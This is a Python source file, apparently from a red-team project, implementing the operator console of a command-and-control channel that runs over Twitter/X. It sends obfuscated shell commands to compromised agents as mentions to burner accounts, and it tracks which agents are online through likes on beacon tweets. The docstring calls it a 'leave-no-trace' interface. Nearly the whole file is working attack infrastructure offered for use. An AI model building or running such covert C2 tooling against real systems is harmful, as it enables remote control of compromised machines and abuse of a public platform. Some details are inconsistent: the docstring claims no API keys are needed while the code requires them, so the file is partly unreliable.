# c2_frameworks/twitter/operator.py
"""
Twitter / X C2 Operator Console
Zero API keys on your machine – works from any browser or phone
Just tweet or reply → agents wake up and execute
The ultimate "leave-no-trace" C2 interface
"""

import tweepy
import json
import time
import random
from datetime import datetime
from typing import Dict, List

from .utils import base94_encode, xor_encrypt, generate_task_id

class TwitterC2Operator:
    def __init__(
        self,
        consumer_key: str,
        consumer_secret: str,
        access_token: str,
        access_token_secret: str,
        burner_accounts: List[str]  # List of @burner1, @burner2, etc.
    ):
        self.burner_accounts = [a.lstrip("@").lower() for a in burner_accounts]
        
        auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
        auth.set_access_token(access_token, access_token_secret)
        self.api = tweepy.API(auth, wait_on_rate_limit=True)
        
        self.operator_handle = self.api.me().screen_name
        print(f"[+] Twitter C2 Operator Console Active")
        print(f"[+] Your handle : @{self.operator_handle}")
        print(f"[+] Burners     : {', '.join(f'@{b}' for b in self.burner_accounts)}")

    def send_task(self, target_burner: str, command: str):
        """Send a command to a specific burner via mention"""
        task_id = generate_task_id()
        payload = {
            "task_id": task_id,
            "command": command,
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }
        
        json_str = json.dumps(payload)
        encrypted = xor_encrypt(json_str.encode(), b"30DaysRedTeam")
        encoded = base94_encode(encrypted)
        
        tweet_text = f"@{target_burner} run:{encoded}"
        
        print(f"[+] Sending task {task_id[:8]}...")
        print(f"    Command: {command}")
        print(f"    Tweet  : {tweet_text[:100]}{'...' if len(tweet_text)>100 else ''}\n")
        
        try:
            self.api.update_status(status=tweet_text)
            print(f"[+] Task dispatched → @{target_burner}")
        except Exception as e:
            print(f"[-] Failed to tweet: {e}")

    def post_beacon_tweet(self):
        """Post a tweet that agents will like as a beacon"""
        tweet = f"Red Team Check-in {int(time.time())} #30DaysOfRedTeam"
        status = self.api.update_status(status=tweet)
        print(f"[+] Beacon tweet posted: {status.id}")
        print(f"    https://twitter.com/{self.operator_handle}/status/{status.id}")
        return status.id

    def list_active_agents(self):
        """Check who liked your latest tweet (simple presence)"""
        try:
            timeline = self.api.home_timeline(count=5)
            beacon_tweet = None
            for tweet in timeline:
                if tweet.user.screen_name == self.operator_handle and "Check-in" in tweet.text:
                    beacon_tweet = tweet
                    break
            if not beacon_tweet:
                print("[-] No beacon tweet found in timeline")
                return
            
            likers = self.api.get_favorites(user_id=beacon_tweet.user.id, count=100)
            print(f"\n[+] Agents online (liked beacon):")
            for user in likers:
                if user.screen_name.lower() in [b.lower() for b in self.burner_accounts]:
                    print(f"    🟢 @{user.screen_name} – {user.name}")
        except Exception as e:
            print(f"[-] Error checking likes: {e}")

    def interactive(self):
        """Simple interactive shell"""
        print("\nTwitter C2 Operator Console")
        print("Commands: list, beacon, send @burner <cmd>, quit\n")
        
        while True:
            try:
                cmd = input("twitter-c2> ").strip()
                if not cmd:
                    continue
                if cmd == "list":
                    self.list_active_agents()
                elif cmd == "beacon":
                    self.post_beacon_tweet()
                elif cmd.startswith("send "):
                    parts = cmd[5:].split(" ", 1)
                    if len(parts) < 2:
                        print("Usage: send @burner whoami")
                        continue
                    target = parts[0]
                    command = parts[1]
                    self.send_task(target, command)
                elif cmd in ["quit", "exit"]:
                    print("[+] Operator console shutdown.")
                    break
                else:
                    print("Commands: list | beacon | send @handle <cmd> | quit")
            except KeyboardInterrupt:
                print("\n[+] Shutting down...")
                break


# ——— Entry Point ———
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Twitter C2 Operator Console")
    parser.add_argument("--ck", required=True, help="Consumer Key")
    parser.add_argument("--cs", required=True, help="Consumer Secret")
    parser.add_argument("--at", required=True, help="Access Token (your main account)")
    parser.add_argument("--ats", required=True, help="Access Token Secret")
    parser.add_argument("--burners", required=True, help="Comma-separated burner handles")

    args = parser.parse_args()

    operator = TwitterC2Operator(
        consumer_key=args.ck,
        consumer_secret=args.cs,
        access_token=args.at,
        access_token_secret=args.ats,
        burner_accounts=args.burners.split(",")
    )
    operator.interactive()